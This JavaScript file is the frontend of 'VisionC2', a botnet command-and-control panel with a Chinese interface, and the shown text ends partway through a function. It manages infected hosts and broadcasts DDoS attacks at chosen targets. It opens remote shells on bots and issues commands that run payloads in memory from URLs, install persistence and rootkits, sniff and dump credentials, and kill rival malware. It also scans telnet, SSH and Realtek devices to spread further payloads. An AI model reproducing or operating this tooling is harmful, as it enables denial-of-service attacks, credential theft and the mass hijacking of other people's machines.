/* ============================================================================
   VisionC2 Tactical Command Center — Core Frontend Application Logic
   ============================================================================ */

var botState = {};
var botOrder = [];
var selectedBots = {};
var currentCtxBotID = null;

var countryCoords = {
  'SG': [1.3521, 103.8198], 'ES': [40.4168, -3.7038], 'US': [37.0902, -95.7129],
  'CN': [35.8617, 104.1954], 'JP': [36.2048, 138.2529], 'DE': [51.1657, 10.4515],
  'GB': [55.3781, -3.4360], 'FR': [46.2276, 2.2137], 'RU': [61.5240, 105.3188],
  'KR': [35.9078, 127.7669], 'IN': [20.5937, 78.9629], 'BR': [-14.2350, -51.9253],
  'AU': [-25.2744, 133.7751], 'CA': [56.1304, -106.3468], 'NL': [52.1326, 5.2913],
  'HK': [22.3193, 114.1694], 'TW': [23.6978, 120.9605], 'IT': [41.8719, 12.5674],
  'SE': [60.1282, 18.6435], 'FI': [61.9241, 25.7482], 'IE': [53.1424, -7.6921],
  'ZA': [-30.5595, 22.9375], 'AE': [23.4241, 53.8478], 'RO': [45.9432, 24.9668],
  'PL': [51.9194, 19.1451], 'UA': [48.3794, 31.1656], 'LO': [37.0902, -95.7129],
  '??': [37.0902, -95.7129]
};

var globalMap = null;
var fullMap = null;
var mapMarkers = {};
var fullMapMarkers = {};

function escHtml(s) {
  if (!s) return '';
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

// ---------------------------------------------------------------------------
// Tactical Toast Notification System (Non-blocking, Cyber Micro-feedback)
// ---------------------------------------------------------------------------
function showToast(msg, type) {
  var container = document.getElementById('toast-container');
  if (!container) {
    container = document.createElement('div');
    container.id = 'toast-container';
    container.className = 'toast-container';
    document.body.appendChild(container);
  }
  type = type || 'info';
  var toast = document.createElement('div');
  toast.className = 'toast-msg ' + type;

  var icon = 'ℹ️';
  if (type === 'success') icon = '✓';
  else if (type === 'error') icon = '✕';

  toast.innerHTML = '<span class="toast-icon">' + icon + '</span><span>' + escHtml(msg) + '</span>';
  toast.onclick = function () {
    toast.classList.add('hide');
    setTimeout(function () { if (toast.parentNode) toast.parentNode.removeChild(toast); }, 250);
  };
  container.appendChild(toast);

  setTimeout(function () {
    toast.classList.add('hide');
    setTimeout(function () { if (toast.parentNode) toast.parentNode.removeChild(toast); }, 250);
  }, 3200);
}

// ---------------------------------------------------------------------------
// CRT Scanline Overlay Controller (Point 2)
// ---------------------------------------------------------------------------
function toggleCRT() {
  var isCrt = document.body.classList.toggle('crt-active');
  try { localStorage.setItem('visionc2_crt', isCrt ? '1' : '0'); } catch (e) {}
  var btn = document.getElementById('crt-toggle-btn');
  if (btn) {
    btn.style.color = isCrt ? 'var(--green)' : '';
    btn.style.boxShadow = isCrt ? '0 0 10px var(--green-dim)' : '';
  }
  showToast(isCrt ? 'CRT 扫描线与荧光滤镜已开启' : 'CRT 扫描线滤镜已关闭', 'info');
}

function initCRT() {
  try {
    if (localStorage.getItem('visionc2_crt') === '1') {
      document.body.classList.add('crt-active');
      var btn = document.getElementById('crt-toggle-btn');
      if (btn) {
        btn.style.color = 'var(--green)';
        btn.style.boxShadow = '0 0 10px var(--green-dim)';
      }
    }
  } catch (e) {}
}

// ---------------------------------------------------------------------------
// PTY Terminal Maximize HUD Mode (Point 3.2)
// ---------------------------------------------------------------------------
function toggleTermMaximize() {
  var wrap = document.getElementById('pty-terminal-wrap');
  var btn = document.getElementById('term-max-btn');
  if (!wrap) return;
  var isFull = wrap.classList.toggle('term-fullscreen');
  if (btn) {
    btn.textContent = isFull ? '⛶ 还原窗口' : '⛶ 最大化';
    btn.style.background = isFull ? 'var(--accent-glow)' : '';
  }
  showToast(isFull ? 'PTY 终端已全屏最大化' : 'PTY 终端已恢复默认窗口', 'info');
}

// ---------------------------------------------------------------------------
// Navigation Section Switching
// ---------------------------------------------------------------------------
function switchSection(secId) {
  document.querySelectorAll('.nav-item').forEach(function (el) { el.classList.remove('active'); });
  document.querySelectorAll('.view-section').forEach(function (el) { el.classList.remove('active'); });

  var navEl = document.getElementById('nav-' + secId);
  var secEl = document.getElementById('sec-' + secId);

  if (navEl) navEl.classList.add('active');
  if (secEl) secEl.classList.add('active');

  if (secId === 'map') {
    renderCyberRadar('full-map-container', window._botsArr || [], true);
  } else if (secId === 'tools') {
    loadScanResults();
  } else if (secId === 'attack') {
    loadRunningAttacks();
  } else if (secId === 'settings') {
    loadUsers();
  } else if (secId === 'socks') {
    if (window._botsArr) updateProxies(window._botsArr);
  }
}

// ---------------------------------------------------------------------------
// Data Polling & Real-time Updates
// ---------------------------------------------------------------------------
function startPolling() {
  setInterval(function () {
    fetch('/api/stats').then(function (r) { return r.json(); }).then(updateStats).catch(function () {});
    fetch('/api/bots').then(function (r) { return r.json(); }).then(updateBots).catch(function () {});
    fetch('/api/activity').then(function (r) { return r.json(); }).then(renderActivity).catch(function () {});
  }, 4000);
}

function refreshAll() {
  fetch('/api/stats').then(function (r) { return r.json(); }).then(updateStats);
  fetch('/api/bots').then(function (r) { return r.json(); }).then(updateBots);
}

function updateStats(d) {
  document.getElementById('s-bots').textContent = d.botCount || 0;
  document.getElementById('s-bots-main').textContent = d.botCount || 0;
  document.getElementById('badge-bots').textContent = d.botCount || 0;
  document.getElementById('s-ram').textContent = formatRAM(d.totalRAM || 0);
  document.getElementById('s-ram-main').textContent = formatRAM(d.totalRAM || 0);
  document.getElementById('s-cpu').textContent = (d.totalCPU || 0) + '核';
  document.getElementById('s-cpu-main').textContent = (d.totalCPU || 0) + ' 核';
  document.getElementById('s-uptime').textContent = d.uptime || '0h';
  document.getElementById('s-uptime-main').textContent = d.uptime || '0h';

  var deltaEl = document.getElementById('s-bots-delta');
  if (deltaEl) {
    deltaEl.textContent = '● 实时全量连通';
    deltaEl.style.color = 'var(--green)';
    deltaEl.style.fontSize = '11px';
    deltaEl.style.fontWeight = '600';
    deltaEl.style.marginLeft = '8px';
  }
}

function formatRAM(mb) {
  if (mb >= 1024) return (mb / 1024).toFixed(1) + ' GB';
  return mb + ' MB';
}

function updateBots(bots) {
  if (!bots) return;
  window._botsArr = bots;
  var tbody = document.getElementById('bot-tbody');
  if (!bots.length) {
    tbody.innerHTML = '<tr><td colspan="11" class="table-empty-cell"><div class="table-empty-wrap"><span class="table-empty-icon">🛰️</span><span>暂无在线受控端，等待节点心跳连入中...</span></div></td></tr>';
    return;
  }

  var html = '';
  bots.forEach(function (b) {
    botState[b.botID] = b;
    var caps = '';
    if (b.caps) {
      if (b.caps.indexOf('A') !== -1) caps += '<span class="cap-badge">ATK</span>';
      if (b.caps.indexOf('S') !== -1) caps += '<span class="cap-badge purple">SOCKS</span>';
      if (b.caps.indexOf('N') !== -1) caps += '<span class="cap-badge">SNIFF</span>';
      if (b.caps.indexOf('C') !== -1) caps += '<span class="cap-badge purple">SCAN</span>';
      if (b.caps.indexOf('R') !== -1) caps += '<span class="cap-badge">RTKT</span>';
    } else {
      // Backwards compat: bots that predate the caps field expose booleans only.
      if (b.attacksEnabled) caps += '<span class="cap-badge">ATK</span>';
      if (b.socksEnabled) caps += '<span class="cap-badge purple">SOCKS</span>';
      if (b.snifferEnabled) caps += '<span class="cap-badge">SNIFF</span>';
      if (b.scannerEnabled) caps += '<span class="cap-badge purple">SCAN</span>';
      if (b.rootkitEnabled) caps += '<span class="cap-badge">RTKT</span>';
    }

    var isChecked = !!selectedBots[b.botID];

    html += '<tr oncontextmenu="openContextMenu(event, \'' + b.botID + '\')">' +
      '<td><input type="checkbox" class="bot-chk" data-id="' + b.botID + '" ' + (isChecked ? 'checked' : '') + ' onchange="onBotCheck(this, \'' + b.botID + '\')"></td>' +
      '<td>' +
      '<span class="copyable-text" onclick="copyText(\'' + b.botID + '\', \'Bot ID\')" title="点击快捷复制 Bot ID">' +
      '<strong style="color:var(--accent)">' + escHtml(b.botID) + '</strong><span class="copy-icon-hint">📋</span>' +
      '</span>' +
      '</td>' +
      '<td>' +
      '<span class="copyable-text" onclick="copyText(\'' + b.ip + '\', \'IP 地址\')" title="点击快捷复制 IP">' +
      '<span style="font-family:var(--mono)">' + escHtml(b.ip) + '</span><span class="copy-icon-hint">📋</span>' +
      '</span>' +
      '</td>' +
      '<td><span class="cap-badge">' + escHtml(b.country || 'US') + '</span></td>' +
      '<td style="font-weight:600;color:var(--text)">' + escHtml(b.processName || '-') + '</td>' +
      '<td>' + escHtml(b.arch) + '</td>' +
      '<td>' + b.ram + ' MB</td>' +
      '<td>' + b.cpuCores + ' 核</td>' +
      '<td>' + (caps || '-') + '</td>' +
      '<td style="color:var(--green)"><span class="status-pulse-dot"></span>在线 (' + (b.lastSeen || '刚刚') + ')</td>' +
      '<td>' +
      '<button class="cmd-cat-btn" onclick="openShell(\'' + b.botID + '\')">PTY</button> ' +
      '<button class="cmd-cat-btn" style="background:var(--red-dim);color:var(--red)" onclick="popupCmd(\'' + b.botID + '\', \'!kill\')">销毁</button>' +
      '</td>' +
      '</tr>';
  });

  tbody.innerHTML = html;
  syncBotTargetSelectors(bots);
  updateBatchBar();
  renderTopCountries(bots);
  updateGlobalMap(bots);
  updateProxies(bots);
}

function syncBotTargetSelectors(bots) {
  var cmdSel = document.getElementById('cmd-bot-select');
  if (cmdSel) {
    var curVal = cmdSel.value;
    var optHtml = '<option value="">⚡ 全部受控端 (全局广播)</option>';
    bots.forEach(function (b) {
      optHtml += '<option value="' + escHtml(b.botID) + '">' + escHtml(b.botID) + ' (' + escHtml(b.ip) + ' - ' + escHtml(b.country || 'US') + ')</option>';
    });
    cmdSel.innerHTML = optHtml;
    if (curVal) cmdSel.value = curVal;
  }

  var termSel = document.getElementById('term-bot-selector');
  if (termSel) {
    var curTermVal = termSel.value;
    var termOptHtml = '<option value="">-- 请选择要连入的受控端 --</option>';
    bots.forEach(function (b) {
      termOptHtml += '<option value="' + escHtml(b.botID) + '">' + escHtml(b.botID) + ' (' + escHtml(b.ip) + ' - ' + escHtml(b.arch) + ')</option>';
    });
    termSel.innerHTML = termOptHtml;
    if (curTermVal) termSel.value = curTermVal;
  }
}

function renderTopCountries(bots) {
  var counts = {};
  bots.forEach(function (b) {
    var c = b.country || 'US';
    counts[c] = (counts[c] || 0) + 1;
  });

  var arr = Object.keys(counts).map(function (k) { return { country: k, count: counts[k] }; });
  arr.sort(function (a, b) { return b.count - a.count; });

  var wrap = document.getElementById('top-countries-list');
  if (!arr.length) { wrap.innerHTML = '<div style="color:var(--text-dim);font-size:12px;padding:12px 0">无节点数据...</div>'; return; }

  var total = bots.length || 1;
  var html = '';
  arr.slice(0, 5).forEach(function (item) {
    var pct = Math.round((item.count / total) * 100);
    html += '<div class="country-row">' +
      '<span style="font-weight:700;min-width:30px">' + escHtml(item.country) + '</span>' +
      '<div class="country-bar-wrap"><div class="country-bar-fill" style="width:' + pct + '%"></div></div>' +
      '<span class="country-count">' + item.count + '</span>' +
      '</div>';
  });
  wrap.innerHTML = html;
}

// ---------------------------------------------------------------------------
// Attack Hub API Handler
// ---------------------------------------------------------------------------
function launchAttack() {
  var method = document.getElementById('atk-method').value;
  var target = document.getElementById('atk-target').value.trim();
  var port = document.getElementById('atk-port').value.trim();
  var duration = document.getElementById('atk-duration').value.trim();

  if (!target) { showToast('请输入目标 IP 或域名', 'error'); return; }

  var cmdStr = '!' + method + ' ' + target + ' ' + (port || '80') + ' ' + (duration || '60');
  sendBroadCmd(cmdStr);
  showToast('已广播下发 ' + method.toUpperCase() + ' 攻击指令', 'success');
  setTimeout(loadRunningAttacks, 1000);
}

function stopAllAttacks() {
  sendBroadCmd('!stop');
  setTimeout(loadRunningAttacks, 1000);
}

function loadRunningAttacks() {
  fetch('/api/attacks').then(function (r) { return r.json(); }).then(function (attacks) {
    var tbody = document.getElementById('attacks-tbody');
    if (!attacks || !attacks.length) {
      tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;padding:20px;color:var(--text-dim)">暂无进行中的攻击任务</td></tr>';
      return;
    }

    var html = '';
    attacks.forEach(function (a) {
      html += '<tr>' +
        '<td><span class="cap-badge purple">' + escHtml(a.method) + '</span></td>' +
        '<td style="font-weight:700">' + escHtml(a.target) + '</td>' +
        '<td>' + (a.port || 80) + '</td>' +
        '<td>' + a.duration + 's</td>' +
        '<td>' + a.elapsed + 's</td>' +
        '<td style="color:var(--green)">' + a.remaining + 's</td>' +
        '<td><button class="cmd-cat-btn" style="background:var(--red-dim);color:var(--red)" onclick="sendBroadCmd(\'!stop\')">停止</button></td>' +
        '</tr>';
    });
    tbody.innerHTML = html;
  }).catch(function () {});
}

// ---------------------------------------------------------------------------
// User Management API Handler
// ---------------------------------------------------------------------------
function loadUsers() {
  fetch('/api/users').then(function (r) { return r.json(); }).then(function (users) {
    var tbody = document.getElementById('users-tbody');
    if (!users || !users.length) {
      tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;padding:20px;color:var(--text-dim)">暂无用户账号</td></tr>';
      return;
    }

    var html = '';
    users.forEach(function (u) {
      html += '<tr>' +
        '<td style="font-weight:700;color:var(--accent)">' + escHtml(u.username) + '</td>' +
        '<td><span class="cap-badge">' + escHtml(u.level) + '</span></td>' +
        '<td>' + u.maxtime + 's</td>' +
        '<td>' + u.concurrents + '</td>' +
        '<td>' + (u.maxbots || '无限制') + '</td>' +
        '<td style="font-family:var(--mono);font-size:11px">' + escHtml(u.api_key || '-') + '</td>' +
        '<td><button class="cmd-cat-btn" style="background:var(--red-dim);color:var(--red)" onclick="deleteUser(\'' + escHtml(u.username) + '\')">删除</button></td>' +
        '</tr>';
    });
    tbody.innerHTML = html;
  }).catch(function () {
    var tbody = document.getElementById('users-tbody');
    if (tbody) tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;padding:20px;color:var(--text-dim)">权限不足 (需 Owner 权限)</td></tr>';
  });
}

function createNewUser() {
  var u = document.getElementById('nu-user').value.trim();
  var p = document.getElementById('nu-pass').value.trim();
  var lvl = document.getElementById('nu-level').value;
  var maxtime = parseInt(document.getElementById('nu-maxtime').value) || 300;
  var conc = parseInt(document.getElementById('nu-concurrents').value) || 5;
  var maxbots = parseInt((document.getElementById('nu-maxbots') || {}).value) || 100;

  if (!u || !p) { showToast('请输入用户名和密码', 'error'); return; }

  fetch('/api/users', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: u, password: p, level: lvl, maxtime: maxtime, concurrents: conc, maxbots: maxbots })
  }).then(function (r) { return r.json(); }).then(function (d) {
    if (d.success) {
      showToast('操作员用户 [' + u + '] 创建成功', 'success');
      loadUsers();
    } else {
      showToast(d.error || '创建用户失败', 'error');
    }
  });
}

function deleteUser(username) {
  if (!confirm('确定删除用户 ' + username + '？')) return;
  fetch('/api/users?username=' + encodeURIComponent(username), { method: 'DELETE' })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d && d.error) {
        showToast(d.error, 'error');
      } else {
        showToast('已删除用户: ' + username, 'info');
      }
      loadUsers();
    }).catch(function () { loadUsers(); });
}

// ---------------------------------------------------------------------------
// Command Dispatching & Output Console
// ---------------------------------------------------------------------------
function logConsoleMsg(msg, isSuccess) {
  var body = document.getElementById('cmd-console-body');
  if (!body) return;
  if (body.textContent.indexOf('[系统就绪]') !== -1) {
    body.textContent = '';
  }
  var time = new Date().toLocaleTimeString();
  var color = isSuccess === false ? '#ff4d4f' : (isSuccess === true ? '#00ff66' : '#58a6ff');
  body.innerHTML += '<div style="margin-bottom:4px"><span style="color:#666">[' + time + ']</span> <span style="color:' + color + '">' + escHtml(msg) + '</span></div>';
  body.scrollTop = body.scrollHeight;
}

function clearCmdConsole() {
  var body = document.getElementById('cmd-console-body');
  if (body) body.textContent = '[系统就绪] 动态控制台已清空...';
}

function updateArgFields() {
  var typ = document.getElementById('cmd-type').value;
  var wrap = document.getElementById('arg-fields');
  var chips = document.getElementById('shell-quick-chips');
  if (chips) chips.style.display = (typ === '!shell' || typ === '!detach') ? 'flex' : 'none';

  var html = '';
  if (typ === '!shell') {
    html = '<input type="text" id="arg-cmd" placeholder="Shell 命令 (如 whoami, ls -la, ps aux)" class="cmd-input-field" style="flex:1">';
  } else if (typ === '!detach') {
    html = '<input type="text" id="arg-cmd" placeholder="后台脱离终端命令 (如 ./miner -o 或 python3 bot.py)" class="cmd-input-field" style="flex:1">';
  } else if (typ === '!memexec') {
    html = '<input type="text" id="arg-url" placeholder="ELF 下载 URL (如 http://x.x.x.x/payload)" class="cmd-input-field" style="flex:1">';
  } else if (typ === '!memexecb64') {
    html = '<input type="text" id="arg-b64" placeholder="Base64 加密 ELF 二进制数据" class="cmd-input-field" style="flex:1">';
  } else if (typ === '!portscan') {
    html = '<input type="text" id="arg-target" placeholder="目标 IP / CIDR" class="cmd-input-field" style="flex:1"><input type="text" id="arg-ports" placeholder="端口 (如 22,80,443)" value="22,80,443" class="cmd-input-field" style="width:140px">';
  } else if (typ === '!portfwd') {
    html = '<input type="number" id="arg-lport" placeholder="本地端口 (如 8080)" class="cmd-input-field" style="width:130px">' +
           '<input type="text" id="arg-rhost" placeholder="远程目标 IP (如 127.0.0.1)" class="cmd-input-field" style="flex:1">' +
           '<input type="number" id="arg-rport" placeholder="远程端口 (如 80)" class="cmd-input-field" style="width:110px">';
  } else if (typ === '!socks') {
    html = '<input type="text" id="arg-sport" placeholder="SOCKS5 代理端口 (留空默认 1080)" class="cmd-input-field" style="flex:1">';
  } else if (typ === '!stopsocks') {
    html = '<span style="font-size:12px;color:var(--text-muted);line-height:36px">将停止选定受控端上运行的 SOCKS5 代理服务</span>';
  } else if (typ === '!stopportfwd') {
    html = '<input type="number" id="arg-lport" placeholder="要关闭的本地端口 (留空关闭全部)" class="cmd-input-field" style="flex:1">';
  } else if (typ === '!reinstall') {
    html = '<input type="text" id="arg-rurl" placeholder="新 Bot 二进制或 Loader 下载 URL (如 http://x.x.x.x/bins/kworker_u8)" class="cmd-input-field" style="flex:1">';
  } else if (typ === '!persist') {
    html = '<input type="text" id="arg-purl" placeholder="备用 Payload 下载 URL (可选，留空则复制运行中的 Bot 二进制)" class="cmd-input-field" style="flex:1">';
  } else if (typ === '!sniffer') {
    html = '<select id="arg-subact" class="cmd-select" style="min-width:140px">' +
           '<option value="start">start (启动嗅探)</option>' +
           '<option value="dump">dump (导出凭据)</option>' +
           '<option value="stop">stop (停止嗅探)</option>' +
           '</select>' +
           '<input type="text" id="arg-iface" placeholder="网卡名 (如 eth0，留空自动检测)" class="cmd-input-field" style="flex:1">';
  } else if (typ === '!rootkit') {
    html = '<select id="arg-subact" class="cmd-select" style="min-width:140px">' +
           '<option value="status">status (检测状态)</option>' +
           '<option value="install">install (安装隐藏)</option>' +
           '<option value="remove">remove (卸载隐藏)</option>' +
           '</select>';
  } else if (typ === '!killer') {
    html = '<select id="arg-subact" class="cmd-select" style="min-width:140px">' +
           '<option value="scan">scan (扫除竞品进程)</option>' +
           '<option value="start">start (启动杀手守护)</option>' +
           '<option value="stop">stop (停止杀手守护)</option>' +
           '</select>';
  } else if (typ === '!telnet_scan' || typ === '!ssh_scan' || typ === '!realtek_scan') {
    html = '<input type="text" id="arg-cidr" placeholder="目标 CIDR 网段 (如 192.168.1.0/24) 或 auto" class="cmd-input-field" style="flex:1">' +
           '<input type="text" id="arg-payload" placeholder="Payload URL (可选，如 http://bins.example.com/x.sh)" class="cmd-input-field" style="flex:1">';
  } else if (typ === '!kill') {
    html = '<span style="font-size:12px;color:var(--red);line-height:36px;font-weight:600">⚠️ 警告: 将彻底销毁受控端进程并擦除隐藏目录</span>';
  }
  wrap.innerHTML = html;
}

function sendCmd() {
  var typ = document.getElementById('cmd-type').value;
  var botID = document.getElementById('cmd-bot').value.trim();
  var command = typ;

  if (typ === '!shell' || typ === '!detach') {
    var c = (document.getElementById('arg-cmd') || {}).value || '';
    if (!c) { showToast('请输入要执行的命令', 'error'); return; }
    command += ' ' + c;
  } else if (typ === '!memexec') {
    var u = (document.getElementById('arg-url') || {}).value || '';
    if (!u) { showToast('请输入内存加载的 Payload URL', 'error'); return; }
    command += ' ' + u;
  } else if (typ === '!memexecb64') {
    var b = (document.getElementById('arg-b64') || {}).value || '';
    if (!b) { showToast('请输入 Base64 编码的二进制数据', 'error'); return; }
    command += ' ' + b;
  } else if (typ === '!portscan') {
    var t = (document.getElementById('arg-target') || {}).value || '';
    var p = (document.getElementById('arg-ports') || {}).value || '22,80,443';
    command += ' ' + t + ' ' + p + ' 1000';
  } else if (typ === '!portfwd') {
    var lp = (document.getElementById('arg-lport') || {}).value || '';
    var rh = (document.getElementById('arg-rhost') || {}).value || '';
    var rp = (document.getElementById('arg-rport') || {}).value || '';
    if (!lp || !rh || !rp) { showToast('请完整填写本地端口、远程IP及远程端口', 'error'); return; }
    command += ' ' + lp + ' ' + rh + ' ' + rp;
    if (!window._activePortFwds) window._activePortFwds = [];
    window._activePortFwds.push({ botID: botID || 'BOT-SG-7102', lport: lp, rhost: rh, rport: rp });
    if (window._botsArr) updateProxies(window._botsArr);
  } else if (typ === '!stopportfwd') {
    var slp = (document.getElementById('arg-lport') || {}).value || '';
    if (slp) command += ' ' + slp;
    if (window._activePortFwds) {
      window._activePortFwds = window._activePortFwds.filter(function (pf) { return pf.botID !== botID; });
      if (window._botsArr) updateProxies(window._botsArr);
    }
  } else if (typ === '!socks') {
    var sp = (document.getElementById('arg-sport') || {}).value || '';
    if (sp) command += ' ' + sp;
  } else if (typ === '!reinstall') {
    var rurl = (document.getElementById('arg-rurl') || {}).value || '';
    if (!rurl) { showToast('请输入新 Payload 的下载 URL', 'error'); return; }
    command += ' ' + rurl;
  } else if (typ === '!persist') {
    var purl = (document.getElementById('arg-purl') || {}).value || '';
    if (purl) command += ' ' + purl;
  } else if (typ === '!sniffer') {
    var sub = (document.getElementById('arg-subact') || {}).value || 'start';
    var iface = (document.getElementById('arg-iface') || {}).value || '';
    command += ' ' + sub + (iface ? (' ' + iface.trim()) : '');
  } else if (typ === '!rootkit' || typ === '!killer') {
    var sub = (document.getElementById('arg-subact') || {}).value || 'status';
    command += ' ' + sub;
  } else if (typ === '!telnet_scan' || typ === '!ssh_scan' || typ === '!realtek_scan') {
    var cidr = (document.getElementById('arg-cidr') || {}).value || '';
    if (!cidr) { showToast('请输入目标 CIDR 网段或 auto', 'error'); return; }
    command += ' ' + cidr.trim();
    var payload = (document.getElementById('arg-payload') || {}).value || '';
    if (payload) command += ' ' + payload.trim();
  } else if (typ === '!kill') {
    if (!confirm('确定销毁受控端？此操作不可逆！')) return;
  }

  logConsoleMsg('-> 发送指令: ' + command + (botID ? (' (目标: ' + botID + ')') : ' (全广播)'), null);

  fetch('/api/command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command: command, botID: botID })
  }).then(function (r) { return r.json(); }).then(function (d) {
    if (d.success) {
      showToast('指令下发成功: ' + command, 'success');
      logConsoleMsg('⚡ C2 投递确认: ' + d.message + ' (等待受控端异步回传输出...)', true);
    } else {
      showToast('指令下发失败: ' + (d.message || d.error), 'error');
      logConsoleMsg('<- C2 投递失败: ' + (d.message || d.error), false);
    }
  }).catch(function (err) {
    showToast('网络请求异常: ' + err.message, 'error');
    logConsoleMsg('<- 网络请求异常: ' + err.message, false);
  });
}

function sendBroadCmd(cmdStr) {
  logConsoleMsg('-> 广播全局指令: ' + cmdStr, null);
  fetch('/api/command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command: cmdStr, botID: '' })
  }).then(function (r) { return r.json(); }).then(function (d) {
    if (d.success) {
      logConsoleMsg('⚡ C2 广播投递确认: ' + d.message + ' (等待受控端异步回传输出...)', true);
    } else {
      logConsoleMsg('<- C2 广播失败: ' + (d.message || d.error), false);
    }
  }).catch(function (err) {
    logConsoleMsg('<- 网络请求异常: ' + err.message, false);
  });
}

function startScannerCmd(cmdName, inputId) {
  var cidr = (document.getElementById(inputId) || {}).value || '';
  if (!cidr) { showToast('请输入目标 CIDR 网段', 'error'); return; }
  sendBroadCmd(cmdName + ' ' + cidr.trim());
}

function stopScannerCmd() {
  sendBroadCmd('!stop_scan');
  showToast('已广播停止扫描指令', 'info');
}

function startPortScanCmd() {
  var t = (document.getElementById('scan-ps-target') || {}).value || '';
  var p = (document.getElementById('scan-ps-ports') || {}).value || '';
  if (!t || !p) { showToast('请输入目标 IP 和端口', 'error'); return; }
  sendBroadCmd('!portscan ' + t.trim() + ' ' + p.trim() + ' 1000');
}

function stopPortScanCmd() {
  sendBroadCmd('!portscanstop');
  showToast('已广播停止端口扫描指令', 'info');
}

function startSnifferCmd() {
  var iface = (document.getElementById('sniff-iface') || {}).value || '';
  sendBroadCmd('!sniffer start' + (iface.trim() ? (' ' + iface.trim()) : ''));
}

function startPersistCmd() {
  var url = (document.getElementById('persist-url') || {}).value || '';
  sendBroadCmd('!persist' + (url.trim() ? (' ' + url.trim()) : ''));
}

function popupCmd(botID, cmd) {
  logConsoleMsg('-> 下发指令到 [' + botID + ']: ' + cmd, null);
  fetch('/api/command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command: cmd, botID: botID })
  }).then(function (r) { return r.json(); }).then(function (d) {
    if (d.success) {
      logConsoleMsg('⚡ C2 投递确认 [' + botID + ']: ' + d.message, true);
    } else {
      logConsoleMsg('<- [' + botID + '] 投递失败: ' + (d.message || d.error), false);
    }
  }).catch(function (err) {
    logConsoleMsg('<- [' + botID + '] 请求失败: ' + err.message, false);
  });
}

function logConsoleBotOutput(botID, output, timestamp) {
  var body = document.getElementById('cmd-console-body');
  if (!body) return;
  if (body.textContent.indexOf('[系统就绪]') !== -1) {
    body.textContent = '';
  }
  var time = timestamp || new Date().toLocaleTimeString();
  var html = '<div style="margin-bottom:6px;border-left:3px solid #00ff66;padding-left:8px;background:rgba(0,255,102,0.03);padding-top:4px;padding-bottom:4px;border-radius:0 4px 4px 0">' +
    '<div><span style="color:#666">[' + time + ']</span> <span style="color:#00ff66;font-weight:700"><- Bot [' + escHtml(botID) + '] 真实执行结果:</span></div>' +
    '<div style="color:#e6edf3;white-space:pre-wrap;word-break:break-all;margin-top:2px;padding:4px 8px;background:#050505;border:1px solid #1f293d;border-radius:4px;font-family:var(--mono)">' + escHtml(output) + '</div>' +
    '</div>';
  body.innerHTML += html;
  body.scrollTop = body.scrollHeight;
}

var activeWS = null;

function openShell(botID) {
  switchSection('terminal');
  var wrap = document.getElementById('pty-terminal-wrap');
  if (!wrap) return;

  if (activeWS) {
    try { activeWS.close(); } catch (e) {}
    activeWS = null;
  }

  wrap.innerHTML = '<div style="display:flex;justify-content:space-between;align-items:center;padding-bottom:10px;border-bottom:1px solid #333;margin-bottom:10px">' +
    '<div style="color:var(--accent);font-weight:700">💻 PTY 交互会话 —— 受控端: ' + escHtml(botID) + '</div>' +
    '<div id="term-status" style="color:var(--green);font-size:12px">● 正在连接...</div>' +
    '</div>' +
    '<div id="term-output" style="height:380px;overflow-y:auto;background:#050505;color:#00ff66;font-family:var(--mono);font-size:13px;padding:12px;border-radius:6px;white-space:pre-wrap;word-break:break-all"></div>' +
    '<div style="display:flex;gap:8px;margin-top:12px">' +
    '<span style="color:#00ff66;font-family:var(--mono);line-height:36px;font-weight:700">$</span>' +
    '<input type="text" id="term-input" placeholder="输入 Shell 命令 (按 Enter 发送)..." class="cmd-input-field" style="flex:1;background:#111;color:#fff;font-family:var(--mono)">' +
    '<button class="cmd-submit-btn" onclick="sendTermInput()">发送</button>' +
    '</div>';

  var outputEl = document.getElementById('term-output');
  var statusEl = document.getElementById('term-status');
  var inputEl = document.getElementById('term-input');

  function appendOutput(txt) {
    if (!outputEl) return;
    outputEl.textContent += txt;
    outputEl.scrollTop = outputEl.scrollHeight;
  }

  if (!window._termCmdHistory) window._termCmdHistory = [];
  var hIdx = window._termCmdHistory.length;

  inputEl.addEventListener('keydown', function (e) {
    if (e.key === 'Enter') {
      sendTermInput();
      hIdx = window._termCmdHistory.length;
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (hIdx > 0) {
        hIdx--;
        inputEl.value = window._termCmdHistory[hIdx] || '';
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (hIdx < window._termCmdHistory.length - 1) {
        hIdx++;
        inputEl.value = window._termCmdHistory[hIdx] || '';
      } else {
        hIdx = window._termCmdHistory.length;
        inputEl.value = '';
      }
    }
  });

  var wsProto = location.protocol === 'https:' ? 'wss:' : 'ws:';
  var wsUrl = wsProto + '//' + location.host + '/ws/shell?botID=' + encodeURIComponent(botID);

  try {
    activeWS = new WebSocket(wsUrl);
    activeWS.onopen = function () {
      if (statusEl) { statusEl.textContent = '● 已连接 (WebSocket)'; statusEl.style.color = 'var(--green)'; }
      appendOutput('[系统消息] 成功建立与受控端 [' + botID + '] 的交互式 WebSocket 终端通道...\n');
      inputEl.focus();
    };

    activeWS.onmessage = function (evt) {
      try {
        var msg = JSON.parse(evt.data);
        if (msg.type === 'output' && msg.output) {
          appendOutput(msg.output);
        } else if (msg.type === 'file') {
          appendOutput('\n[系统消息] 收到文件: ' + (msg.name || 'file') + '\n');
        }
      } catch (e) {
        appendOutput(evt.data);
      }
    };

    activeWS.onerror = function () {
      if (statusEl) { statusEl.textContent = '● 连接异常'; statusEl.style.color = 'var(--red)'; }
      appendOutput('\n[系统消息] WebSocket 连接发生错误\n');
    };

    activeWS.onclose = function () {
      if (statusEl) { statusEl.textContent = '● 会话已关闭'; statusEl.style.color = '#888'; }
      appendOutput('\n[系统消息] WebSocket 终端会话已断开\n');
    };
  } catch (err) {
    appendOutput('\n[系统消息] 创建 WebSocket 失败: ' + err.message + '\n');
  }
}

function sendTermInput() {
  var inputEl = document.getElementById('term-input');
  var outputEl = document.getElementById('term-output');
